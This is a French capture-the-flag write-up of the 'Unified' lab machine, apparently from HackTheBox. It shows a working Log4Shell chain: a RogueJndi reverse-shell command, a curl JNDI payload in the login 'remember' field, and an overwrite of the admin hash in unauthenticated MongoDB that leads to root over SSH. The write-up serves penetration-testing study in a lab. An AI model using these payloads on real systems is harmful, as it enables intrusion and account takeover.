[⬅ Retour à Starting Point](../README.md) · [🏠 Accueil du repo](../../../README.md)

# Machine 13 — Unified

**Log4Shell + MongoDB — Ports 22, 6789, 8080, 8443**

| | |
|---|---|
| **Tier** | 2 |
| **OS** | Linux |
| **Services** | SSH (22) · UniFi STUN (6789) · HTTP (8080) · UniFi Network HTTPS (8443) |

## Concept

Exploitation de la vulnérabilité Log4Shell (**CVE-2021-44228**) sur UniFi Network 6.4.54, puis escalade via manipulation de la base MongoDB locale (port 27117) pour obtenir les identifiants root en clair depuis le panneau d'administration.

```mermaid
flowchart LR
    A["nmap -p- -sC -sV"] --> B["UniFi Network 6.4.54<br/>:8443"]
    B --> C["Log4Shell CVE-2021-44228<br/>JNDI via RogueJndi"]
    C --> D["Payload dans champ 'remember'<br/>POST /api/login"]
    D --> E["Reverse shell<br/>user: unifi"]
    E --> F["ps aux | grep mongod<br/>port 27117"]
    F --> G["mongo → db.admin.update<br/>nouveau hash SHA-512"]
    G --> H["Login panneau UniFi<br/>Settings → SSH Authentication"]
    H --> I["Mot de passe root en clair<br/>ssh root@ → flag"]
```



## Méthodologie

### Scan de ports

```bash
nmap -sC -sV -p- 10.129.x.x
```

```
22/tcp   open  ssh
6789/tcp open  ibm-db2 (UniFi STUN)
8080/tcp open  http-proxy
8443/tcp open  https-alt  (UniFi Network)
```

Version détectée via `/status` : **UniFi Network 6.4.54**, vulnérable à Log4Shell (CVE-2021-44228). Protocole JNDI utilisé : LDAP.

### Exploitation Log4Shell

Listener sur Kali :

```bash
nc -lvnp 9001
```

Lancer **RogueJNDI** (contourne `trustURLCodebase` désactivé sur JVM récente) :

```bash
java -jar RogueJndi-1.1.jar \
  --command "bash -c {echo,BASE64_REVERSE_SHELL}|{base64,-d}|{bash,-i}" \
  --hostname "10.10.x.x"
```

Surveillance du trafic LDAP pour confirmer la callback :

```bash
sudo tcpdump -i tun0 port 389 or port 1389 -n
```

Payload injecté dans le champ `remember` du `POST /api/login` — **et non** dans le champ `username` :

```bash
curl -k "https://10.129.x.x:8443/api/login" \
  -H "Content-Type: application/json" -X POST \
  -d '{"username":"test","password":"test","remember":"${jndi:ldap://10.10.x.x:1389/o=tomcat}"}'
```

→ reverse shell reçu en tant qu'utilisateur `unifi`.

### Flag utilisateur

```bash
cat /home/michael/user.txt
# 6ced1a6a89e666c0620cdb10262ba127
```

### Escalade via MongoDB

```bash
ps aux | grep mongod
```

```
mongod --port 27117 --dbpath /usr/lib/unifi/data/db
```

```bash
mongo --port 27117
```

```js
use ace
db.admin.find().forEach(printjson)
```

→ utilisateurs (`administrator`, `michael`, ...) avec hash SHA-512 (`x_shadow`).

Générer un nouveau hash sur Kali (plutôt que de tenter de craquer l'existant) :

```bash
mkpasswd -m sha-512 Password1234
```

Mettre à jour le hash de `administrator` directement dans MongoDB :

```js
db.admin.update(
  {"_id": ObjectId("61ce278f46e0fb0012d47ee4")},
  {$set:{"x_shadow":"$6$xxxxx$xxxxxxxx"}}
)
```

### Accès au panneau et récupération du mot de passe root

Connexion sur `https://10.129.x.x:8443` : `administrator` / `Password1234`.

**Settings → Site → Device Authentication / SSH Authentication** → mot de passe root en clair : `NotACrackablePassword4U2022`.

### Root

```bash
ssh root@10.129.x.x   # Password: NotACrackablePassword4U2022
cat /root/root.txt
# e50bc93c75b634e4b272d2f771c33681
```

## Points clés

- Log4Shell (CVE-2021-44228) permet une RCE via injection JNDI (LDAP) dans le champ `remember` du login, et non dans le champ `username`.
- `tcpdump` sur le port 389/1389 confirme que le callback LDAP a bien eu lieu, même quand la réponse HTTP de l'API semble être une erreur.
- Sur les JVM récentes (`trustURLCodebase=false` par défaut), marshalsec seul ne suffit plus : RogueJndi utilise des gadgets de désérialisation locaux (ex: `o=tomcat`) qui n'ont pas besoin de charger une classe distante.
- MongoDB embarqué dans UniFi écoute sur le port non standard **27117** (pas 27017) et n'a pas d'authentification.
- La base MongoDB par défaut s'appelle `ace` ; `db.admin.find()` énumère les utilisateurs et `db.admin.update()` permet de modifier directement le hash `x_shadow` (SHA-512) d'un compte, sans avoir à le cracker.
- Le panneau d'administration UniFi stocke le mot de passe root SSH **en clair** dans les paramètres du site (Settings → Site → SSH Authentication).
- Toujours générer son propre hash SHA-512 (`mkpasswd -m sha-512`) plutôt que de tenter de craquer le hash existant : c'est bien plus rapide pour prendre le contrôle d'un compte applicatif.

## Leçon retenue

*Une application de gestion réseau (UniFi) non patchée + une base MongoDB locale sans authentification + des credentials root stockés en clair dans le panneau = compromission totale. Toujours patcher Log4j et ne jamais stocker de mots de passe root en clair dans une interface web.*

---

## Conclusion générale — Starting Point

Ce que ces 13 machines enseignent, dans l'ordre :

- Toujours commencer par un scan Nmap complet (`-sV -sC`, éventuellement `-p-`) avant toute hypothèse.
- Tester systématiquement les accès anonymes / par défaut (FTP anonyme, SMB null session, Redis sans mot de passe) avant de chercher des exploits complexes.
- Les fichiers de configuration (`db.php`, `.env`, backups) sont des sources fréquentes de fuite d'identifiants réutilisables ailleurs.
- Le contrôle d'accès doit toujours être revérifié côté serveur — jamais se fier à un cookie ou un paramètre client.
- Les binaires SUID appelant des commandes externes sans chemin absolu sont vulnérables au détournement de `$PATH`.
- `sqlmap --os-shell` n'est pas un terminal interactif : privilégier une connexion SSH stable dès que des identifiants valides sont trouvés.
- GTFOBins est une ressource indispensable pour transformer un droit sudo restreint en accès root.
- Sur Windows, l'énumération de fichiers de configuration (`.dtsConfig`, `web.config`) et d'historiques (`ConsoleHost_history.txt`) remplace souvent l'exploitation technique pure.
- Log4Shell (CVE-2021-44228) reste critique des années après sa découverte : toujours vérifier les versions de logiciels Java exposés et tester les injections JNDI sur tous les champs d'un formulaire, pas seulement les plus évidents.
- Une base de données locale sans authentification (MongoDB sur un port non standard, par exemple) est une mine d'or après un premier foothold applicatif.

*Prochaine étape : machines classiques HTB pour consolider ces bases → [Cap, Orion, Nexus, Reactor](../../machines/README.md).*

---

[⬅ Précédent : Archetype](12-archetype.md) · [⬆ Index Starting Point](../README.md)
